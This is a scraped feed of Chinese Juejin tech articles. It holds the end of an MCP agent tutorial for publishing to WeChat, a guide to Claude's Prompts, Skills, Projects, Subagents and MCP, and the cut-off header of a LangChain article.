        <span class="hljs-attr">parameters</span>: tool.<span class="hljs-property">inputSchema</span>, <span class="hljs-comment">// MCP 的 schema 通常直接兼容</span>
    },
}));
</code></pre>
<p>此时，<code>openaiTools</code> 里就装满了诸如 <code>publish_article</code> 之类的方法描述。</p>
<h3 data-id="heading-5">4. 思考与决策</h3>
<p>现在进入核心环节。我们将文章内容和需求告诉 LLM，让它自己判断该做什么。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> llmClient = <span class="hljs-keyword">new</span> <span class="hljs-title class_">OpenAI</span>({ <span class="hljs-attr">apiKey</span>: <span class="hljs-variable constant_">LLM_API_KEY</span>, <span class="hljs-attr">baseURL</span>: <span class="hljs-variable constant_">LLM_BASE_URL</span> });
<span class="hljs-keyword">const</span> content = <span class="hljs-string">"./test/publish.md"</span>; <span class="hljs-comment">// 待发布的文章路径</span>

<span class="hljs-comment">// 用户的指令：既包含了目标（发布），也包含了参数（使用 phycat 主题）</span>
<span class="hljs-keyword">const</span> userPrompt = { 
    <span class="hljs-attr">role</span>: <span class="hljs-string">"user"</span>, 
    <span class="hljs-attr">content</span>: <span class="hljs-string">`使用phycat主题将这篇文章发布到微信公众号：\n\n<span class="hljs-subst">${content}</span>`</span> 
};

<span class="hljs-comment">// 第一轮对话：询问 LLM</span>
<span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> llmClient.<span class="hljs-property">chat</span>.<span class="hljs-property">completions</span>.<span class="hljs-title function_">create</span>({
    <span class="hljs-attr">model</span>: <span class="hljs-variable constant_">LLM_MODEL</span>,
    <span class="hljs-attr">messages</span>: [userPrompt],
    <span class="hljs-attr">tools</span>: openaiTools, <span class="hljs-comment">// 把工具箱展示给它</span>
    <span class="hljs-attr">tool_choice</span>: <span class="hljs-string">"auto"</span>, <span class="hljs-comment">// 让模型自己决定是否用工具</span>
});
</code></pre>
<p>在这里，模型会分析 <code>userPrompt</code>。它发现你的意图是“发布”，并且它看到了 <code>openaiTools</code> 里有一个能发布的工具，于是它不会直接回答“好的”，而是会返回一个 <code>tool_calls</code> 请求。</p>
<h3 data-id="heading-6">5. 执行工具与反馈</h3>
<p>智能体捕获到模型的调用请求，真正的去执行操作，并将结果反馈给模型。这就是**“优化答案”**的前奏。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> assistantMessage = response.<span class="hljs-property">choices</span>[<span class="hljs-number">0</span>].<span class="hljs-property">message</span>;

<span class="hljs-keyword">if</span> (assistantMessage.<span class="hljs-property">tool_calls</span>) {
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> toolCall <span class="hljs-keyword">of</span> assistantMessage.<span class="hljs-property">tool_calls</span>) {
        <span class="hljs-keyword">const</span> name = toolCall.<span class="hljs-property">function</span>.<span class="hljs-property">name</span>;
        <span class="hljs-keyword">const</span> args = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(toolCall.<span class="hljs-property">function</span>.<span class="hljs-property">arguments</span>);

        <span class="hljs-comment">// 关键步骤：通过 MCP Client 真正的调用 Docker 里的服务</span>
        <span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> client.<span class="hljs-title function_">callTool</span>({
            <span class="hljs-attr">name</span>: name,
            <span class="hljs-attr">arguments</span>: args,
        });

        <span class="hljs-comment">// 获取工具执行结果（比如：发布成功的链接）</span>
        <span class="hljs-keyword">const</span> toolContent = result.<span class="hljs-property">content</span>.<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">item</span>) =&gt;</span> item.<span class="hljs-property">text</span>).<span class="hljs-title function_">join</span>(<span class="hljs-string">"\n"</span>);
        
        <span class="hljs-comment">// 将结果拼接回对话历史</span>
        <span class="hljs-keyword">const</span> finalMessages = [
            userPrompt,
            assistantMessage,
            {
                <span class="hljs-attr">role</span>: <span class="hljs-string">"tool"</span>,
                <span class="hljs-attr">tool_call_id</span>: toolCall.<span class="hljs-property">id</span>,
                <span class="hljs-attr">content</span>: toolContent,
            },
        ];

        <span class="hljs-comment">// 第二轮对话：让 LLM 根据工具执行结果给用户一个最终回复</span>
        <span class="hljs-keyword">const</span> finalResponse = <span class="hljs-keyword">await</span> llmClient.<span class="hljs-property">chat</span>.<span class="hljs-property">completions</span>.<span class="hljs-title function_">create</span>({
            <span class="hljs-attr">model</span>: <span class="hljs-variable constant_">LLM_MODEL</span>,
            <span class="hljs-attr">messages</span>: finalMessages,
        });

        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(finalResponse.<span class="hljs-property">choices</span>[<span class="hljs-number">0</span>].<span class="hljs-property">message</span>.<span class="hljs-property">content</span>);
    }
}
</code></pre>
<h2 data-id="heading-7">发生了什么？</h2>
<p>让我们回顾一下整个流程：</p>
<ol>
<li><strong>User</strong>: "帮我把 <code>publish.md</code> 发到公众号。"</li>
<li><strong>LLM</strong>: (思考：我不能直接操作微信，但我有一个叫 <code>publish_article</code> 的工具。我需要提取参数：文件路径和主题。) -&gt; <strong>发出指令</strong>。</li>
<li><strong>Agent (JS代码)</strong>: 收到指令，通过 MCP 协议告诉 Docker 容器里的服务：“嘿，运行一下这个函数”。</li>
<li><strong>MCP Server</strong>: 执行实际的 API 调用，转换 Markdown，上传素材，保存到草稿箱，返回结果：“发布成功，文章链接是 xxx”。</li>
<li><strong>LLM</strong>: 收到结果，组织语言。 -&gt; <strong>最终回复</strong>: "您的文章已成功发布，使用了 phycat 主题，链接如下：xxx。"</li>
</ol>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e418e70b48dc479692143f5fda320500~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Lev6L6555qE6Zi_5LiN:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769069546&amp;x-signature=anCTzNVjdAK9dbI%2FrlfT2Z18Uy4%3D" alt="mcp-workflow" loading="lazy"/></p>
<h2 data-id="heading-8">总结</h2>
<p>通过引入 MCP，我们把“智能体”的代码写得非常通用。</p>
<p>注意到了吗？上面这段代码里，<strong>没有任何一行是关于微信 API 的具体实现的</strong>。如果不加载 <code>wenyan-mcp</code>，而是换成一个 <code>filesystem-mcp</code>，这段代码逻辑几乎不用变，智能体就能拥有操作文件的能力。</p>
<p>这就是现代智能体架构的魅力：<strong>大模型负责逻辑，MCP 负责能力，智能体程序负责连接。</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[理解 Claude 的 Agentic 生态：把零散能力组织成可持续的工作流]]></title>    <link>https://juejin.cn/post/7595393113552961551</link>    <guid>https://juejin.cn/post/7595393113552961551</guid>    <pubDate>2026-01-15T08:58:29.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595393113552961551" data-draft-id="7595185093833981987" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="理解 Claude 的 Agentic 生态：把零散能力组织成可持续的工作流"/> <meta itemprop="keywords" content="人工智能,Claude"/> <meta itemprop="datePublished" content="2026-01-15T08:58:29.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="智谱开放平台"/> <meta itemprop="url" content="https://juejin.cn/user/2056503277400843"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            理解 Claude 的 Agentic 生态：把零散能力组织成可持续的工作流
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2056503277400843/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    智谱开放平台
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T08:58:29.000Z" title="Thu Jan 15 2026 08:58:29 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读9分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>自从推出 <strong>Skills</strong> 以来，很多人都想搞清楚：Claude 这套 <strong>Agentic（智能体化）生态</strong>里，各个组件到底是怎么协同工作的。</p>
<p>不管你是在 <strong>Claude Code</strong> 里搭建复杂工作流，用 <strong>API</strong> 做企业级解决方案，还是在 <strong>Claude.ai</strong> 上提升日常效率——只要你能判断“该用哪个组件、什么时候用”，你和 Claude 的协作方式就会从「与 <a href="https://link.juejin.cn?target=https%3A%2F%2Fzhipuaishengchan.datasink.sensorsdata.cn%2Ft%2FKH" target="_blank" title="https://zhipuaishengchan.datasink.sensorsdata.cn/t/KH" ref="nofollow noopener noreferrer">GLM-4.7</a> 的临时对话」升级为「稳定的工作系统」。</p>
<p>这份指南会围绕几个关键“组件”展开：它们分别解决什么问题、适用于哪些场景，以及如何组合使用，搭出更强大的智能体工作流。</p>
<hr/>
<h2 data-id="heading-0"><strong>先明确一下定位：它们分别解决什么问题？</strong></h2>
<p>为了避免概念混在一起，可以用一句话抓住每个组件的定位：</p>
<ul>
<li><strong>Prompts</strong>：你在当下对话里给 Claude 的指令（即时、灵活，但不持久）</li>
<li><strong>Skills</strong>：可复用的“操作手册 + 资源包”（让 Claude 稳定地按同一套方法做事）</li>
<li><strong>Projects</strong>：面向某个工作主题的长期工作空间（持续积累知识与对话上下文）</li>
<li><strong>Subagents</strong>：分工明确的“子角色/子助手”（独立上下文 + 权限隔离，用于专门任务）</li>
<li><strong>MCP</strong>：连接层协议（让 Claude 接入外部工具与数据源，解决“数据在哪儿”）</li>
</ul>
<p>有了这个总框架，下面再看每一项，就更容易理解它们之间的关系与边界。</p>
<hr/>
<h2 data-id="heading-1"><strong>Prompts：对话中的指令</strong></h2>
<p><strong>Prompts（提示词）是你在 Claude 进行对话时，用自然语言给出的指令。它的特点是即时、对话式、可随时调整</strong>：你在当下补充背景、提出要求，Claude 依据当前输入完成一次响应。</p>
<h3 data-id="heading-2"><strong>适用场景</strong></h3>
<ul>
<li><strong>一次性需求</strong>：例如「总结这篇文章」</li>
<li><strong>对话中的迭代优化</strong>：例如「把语气改得更专业」</li>
<li><strong>即时上下文输入</strong>：例如「分析这份数据并识别趋势」</li>
<li><strong>临时格式/呈现要求</strong>：例如「按项目符号列表输出」</li>
</ul>
<h3 data-id="heading-3"><strong>示例 Prompt</strong></h3>
<pre><code class="hljs language-sql" lang="sql">Please conduct a comprehensive security review <span class="hljs-keyword">of</span> this code. I<span class="hljs-string">'m looking for:
1. Common vulnerabilities including:
Injection flaws (SQL, command, XSS, etc.)
Authentication and authorization issues
Sensitive data exposure
Security misconfigurations
Broken access control
Cryptographic failures
Input validation problems
Error handling and logging issues
2. For each issue you find, please provide:
Severity level (Critical/High/Medium/Low)
Location in the code (line numbers or function names)
Explanation of why it'</span>s a security risk <span class="hljs-keyword">and</span> how it could be exploited
<span class="hljs-keyword">Specific</span> fix recommendation <span class="hljs-keyword">with</span> code examples <span class="hljs-keyword">where</span> possible
Best practice guidance <span class="hljs-keyword">to</span> prevent <span class="hljs-keyword">similar</span> issues
<span class="hljs-number">3.</span> Code context: [<span class="hljs-keyword">Describe</span> what the code does, the <span class="hljs-keyword">language</span><span class="hljs-operator">/</span>framework, <span class="hljs-keyword">and</span> the environment it runs <span class="hljs-keyword">in</span> <span class="hljs-operator">-</span> e.g., "This is a Node.js REST API that handles user authentication and processes payment data"]
<span class="hljs-number">4.</span> Additional considerations:
<span class="hljs-keyword">Are</span> there <span class="hljs-keyword">any</span> OWASP Top <span class="hljs-number">10</span> vulnerabilities present?
Does the code follow security best practices <span class="hljs-keyword">for</span> [<span class="hljs-keyword">specific</span> framework<span class="hljs-operator">/</span><span class="hljs-keyword">language</span>]?
<span class="hljs-keyword">Are</span> there <span class="hljs-keyword">any</span> dependencies <span class="hljs-keyword">with</span> known vulnerabilities?
Please prioritize findings <span class="hljs-keyword">by</span> severity <span class="hljs-keyword">and</span> potential impact. 
</code></pre>
<blockquote>
<p><strong>小提示：</strong></p>
<p>Prompts 是交互的<strong>主要方式</strong>，但它们<strong>不会跨对话自动保留</strong>。如果某类工作流程需要反复使用，或涉及较强的专业 / 组织知识，建议把这些内容沉淀为 <strong>Skills</strong> 或 <strong>Projects</strong>，以获得更稳定一致的执行效果。</p>
<p>比如把「按 OWASP 标准做代码安全审查」或「按‘执行摘要-关键发现-建议’的结构输出分析」这类高频要求整理为 Skill，这样你无需每次重复说明流程，同时也能保证输出的一致性与可复用性。</p>
</blockquote>
<hr/>
<h2 data-id="heading-4"><strong>Skills：把高频方法论变成可复用能力</strong></h2>
<p><strong>Skills</strong> 可以理解为“文件夹式”的能力包：里面可以放<strong>指令说明、脚本、资源文件</strong>。Claude 在处理任务时会<strong>按需发现并动态加载</strong>，从而在特定领域更稳定、更专业。</p>
<p>你可以把 Skills 理解成给 Claude 配置的一套“专项工作手册”：从处理 Excel 表格，到遵循公司的品牌规范，都可以通过 Skills 固化下来。</p>
<h3 data-id="heading-5"><strong>如何加载 Skills？</strong></h3>
<p>当 Claude 处理任务时，它会先去扫描当前可用的 Skills，找出可能相关的那几个。Skills 采用<strong>渐进式加载（progressive disclosure）</strong> 机制：</p>
<ul>
<li><strong>先加载元信息（metadata）</strong> ：大概 ~100 tokens，只给 Claude 足够的信息，用来判断“这个 Skill 有没有用”</li>
<li><strong>需要时再加载完整说明</strong>：不超过 5k tokens</li>
<li><strong>脚本/文件等资源</strong>：只有在真的用到时才会加载</li>
</ul>
<p>简单说就是：<strong>先快速定位，再按需深入，最后才动用资源</strong> —— 既省上下文，也更稳。</p>
<h3 data-id="heading-6"><strong>适用场景</strong></h3>
<p>当你希望 Claude <strong>稳定、重复、高效</strong>地完成某类“专业任务”时，优先选择 Skills。典型场景包括：</p>
<ul>
<li><strong>组织级工作流（标准化流程）</strong> ：用于固化企业内部的统一规范与流程，例如品牌使用规范、合规/审批流程、常用文档与模板体系。</li>
<li><strong>领域型能力（专业任务能力）</strong> ：用于沉淀特定领域的操作方法与最佳实践，例如 Excel 公式与建模、PDF 解析与处理、数据清洗与分析。</li>
<li><strong>个人偏好（个性化工作方式）</strong> ：用于固化个人在工作中的偏好与习惯，例如笔记结构与记录规则、代码风格与工程约定、调研方法与信息整理流程。</li>
</ul>
<p><strong>举一个例子：</strong></p>
<p>你可以做一个“品牌规范”的 Skill，把你们公司的<strong>色板、字体规范、版式规范</strong>都放进去。这样 Claude 在生成 <strong>PPT 或文档</strong> 时，就会自动套用这些标准，也就是说你不用每次都从头解释一遍。</p>
<hr/>
<h2 data-id="heading-7"><strong>Projects：建立长期工作空间</strong></h2>
<p><strong>Projects（项目）是一种自包含的工作空间：每个项目有独立的聊天记录与知识库，并提供 200K context window。你可以在其中上传资料、补充背景，并设置项目级自定义指令</strong>，对该项目内的所有对话生效。</p>
<h3 data-id="heading-8"><strong>Projects 是怎么工作的？</strong></h3>
<p>你上传到<strong>项目知识库</strong>的内容，<strong>会在该项目内的所有对话中持续可用。</strong> Claude 会自动利用这些上下文，为你生成更充分、更相关的回答。</p>
<p><strong>当项目知识接近上下文限制时，Claude 会无缝启用 RAG（Retrieval Augmented Generation，检索增强生成）模式，将可用容量扩展至最高 10 倍</strong>。</p>
<h3 data-id="heading-9"><strong>适用场景</strong></h3>
<p>当你需要以下能力时，优先选择 Projects：</p>
<ul>
<li><strong>持久上下文</strong>：需要让同一批背景知识持续影响每次对话</li>
<li><strong>工作空间组织</strong>：为不同项目/计划隔离不同的上下文，互不干扰</li>
<li><strong>团队协作</strong>：共享知识库与对话历史（适用于 <strong>Team / Enterprise</strong> 套餐）</li>
<li><strong>自定义指令</strong>：为项目设置专属的语气、视角或工作方式</li>
</ul>
<p><strong>举一个例子：</strong></p>
<p>在创建一个「<strong>Q4 Product Launch</strong>」项目时，你可以把把市场调研、竞品分析、产品规格等材料统一放进去。此后你在该项目开启的每一次对话，都能直接调用这些内容，无需反复上传或重复解释背景。</p>
<blockquote>
<p><strong>小提示：</strong></p>
<p><strong>Projects</strong> 的核心作用是：为某个特定工作场景提供<strong>持续的上下文</strong>（比如公司代码库、研究课题、长期客户项目）。而 <strong>Skills</strong> 的核心作用是：教会 Claude <strong>“怎么做”</strong> 某件事。</p>
<p>举例来说，Project 可以存放产品发布相关的所有背景材料；Skill 则可以沉淀你们团队的写作规范或代码评审流程。如果你发现自己在多个 Projects 之间反复复制同一套指令，你可以把这些通用规则抽出来做成一个 Skill。</p>
</blockquote>
<hr/>
<h2 data-id="heading-10"><strong>Subagents ：把任务拆分给“独立执行单元”</strong></h2>
<p><strong>Subagents（子代理）</strong> 是一类面向特定任务的 AI 助手，它拥有独立的上下文窗口、可定制的系统提示词，以及被明确限定的工具权限。它们可在 <strong>Claude Code</strong> 与 <strong>Claude Agent SDK</strong> 中使用，用于独立处理离散任务并回传结果给主代理。</p>
<h3 data-id="heading-11"><strong>Subagents 是怎么工作的？</strong></h3>
<p>你可以为每个 subagent 定义：</p>
<ul>
<li>它负责什么？</li>
<li>如何处理问题？</li>
<li>能访问哪些工具？</li>
</ul>
<p>Claude 可以根据 subagent 的描述<strong>自动把任务委派</strong>给合适的 subagent；你也可以在对话中<strong>直接指定</strong>调用某个 subagent。</p>
<h3 data-id="heading-12"><strong>适用场景</strong></h3>
<p>Subagents 特别适合以下需求：</p>
<ul>
<li><strong>任务专精</strong>：如代码审查、测试用例生成、安全审计</li>
<li><strong>上下文管理</strong>：把主对话保持在主线，把专业且细碎的工作下放给子代理处理</li>
<li><strong>并行处理</strong>：多个 subagent 可同时处理不同维度的工作</li>
<li><strong>工具隔离与限制</strong>：将特定 subagent 限定为更安全的操作范围（例如只读权限）</li>
</ul>
<p><strong>举一个例子：</strong></p>
<p>创建一个 <strong>code-reviewer subagent</strong>，仅允许使用 <strong>Read / Grep / Glob</strong> 等读取与检索工具，不开放 <strong>Write / Edit</strong>。这样当你修改代码后，Claude 可以自动将质量与安全审查交给该 subagent 完成，同时避免出现“意外改动代码”的风险。</p>
<blockquote>
<p><strong>小提示：</strong></p>
<p>如果你希望<strong>多个代理或多段对话</strong>都复用同一套专业方法（例如安全审查流程、数据分析方法），建议将这些知识沉淀为 <strong>Skill</strong>，而不是写死在某个 subagent 里。</p>
<p>一句话区分：</p>
<ul>
<li>用 <strong>Skills</strong>：把“怎么做”教给所有代理都能用</li>
<li>用 <strong>Subagents</strong>：需要独立执行、权限隔离、上下文隔离，并且能按角色分工完成任务</li>
</ul>
</blockquote>
<hr/>
<h2 data-id="heading-13"><strong>MCP：让 Claude 接入外部工具与数据源</strong></h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/02623cbb4b5e42aeaf7625908f237933~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm66LCx5byA5pS-5bmz5Y-w:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769072620&amp;x-signature=HagOD14lUey%2FqTO%2FoJwQhg2CnUY%3D" alt="" loading="lazy"/></p>
<p><em><strong>MCP</strong></em> <em>在 AI 应用与既有工具、数据源之间，提供了一层</em><em><strong>通用的连接接口</strong></em> <em>。</em></p>
<p><em>通过 MCP，AI 应用可以用更统一的方式接入你现有的工具链与数据来源。</em></p>
<p><strong>Model Context Protocol（MCP）</strong> 是一个开放标准，用于把 AI 助手连接到外部系统 —— 内容库、企业业务工具、数据库、开发环境等。</p>
<h3 data-id="heading-14"><strong>MCP 是怎么工作的？</strong></h3>
<p>MCP 提供了一套标准化的连接方式，让 Claude 能以<strong>统一协议</strong>接入你的工具与数据源。相比为每个数据源单独开发一套集成，你只需要对接 <strong>同一个协议</strong> 即可。</p>
<ul>
<li><strong>MCP Server（服务器端）</strong> ：对外暴露数据与能力（比如读取文档、查询数据库、调用某个工具能力）</li>
<li><strong>MCP Client（客户端）</strong> ：由 Claude 等 AI 应用扮演，负责连接这些服务器并发起调用</li>
</ul>
<h3 data-id="heading-15"><strong>适用场景</strong></h3>
<p>当你需要 Claude 做到以下能力时，适合选择 MCP：</p>
<ul>
<li><strong>访问外部数据</strong>：如 Google Drive、Slack、GitHub、各类数据库</li>
<li><strong>调用业务系统</strong>：如 CRM、项目管理平台等</li>
<li><strong>连接开发环境</strong>：本地文件、IDE、版本控制系统等</li>
<li><strong>对接自研系统</strong>：企业内部的专有工具与数据源</li>
</ul>
<p><strong>举一个例子：</strong></p>
<p>通过 MCP 将 Claude 连接到公司 Google Drive。此后 Claude 就能直接<strong>搜索文档、读取文件、引用内部知识</strong>，无需你手动上传；而且这种连接可以<strong>持续生效并自动更新</strong>。</p>
<blockquote>
<p><strong>小提示：</strong></p>
<p>可以这样理解：<strong>MCP</strong> 解决的是“<strong>让 Claude 连接到哪里、拿到什么数据</strong>”。如果你需要 Claude <strong>先能访问数据库或 Excel 文件本身</strong>，那就是 <strong>MCP</strong> 的范畴。</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[LangChain 框架基础知识和核心组件Prompts，Chains]]></title>    <link>https://juejin.cn/post/7595423675458240550</link>    <guid>https://juejin.cn/post/7595423675458240550</guid>    <pubDate>2026-01-15T10:10:12.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595423675458240550" data-draft-id="7595341943338844170" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="LangChain 框架基础知识和核心组件Prompts，Chains"/> <meta itemprop="keywords" content="Gemini,OpenAI,LangChain"/> <meta itemprop="datePublished" content="2026-01-15T10:10:12.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="草帽lufei"/> <meta itemprop="url" content="https://juejin.cn/user/501033035632093"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            LangChain 框架基础知识和核心组件Prompts，Chains
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/501033035632093/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    草帽lufei
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T10:10:12.000Z" title="Thu Jan 15 2026 10:10:12 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
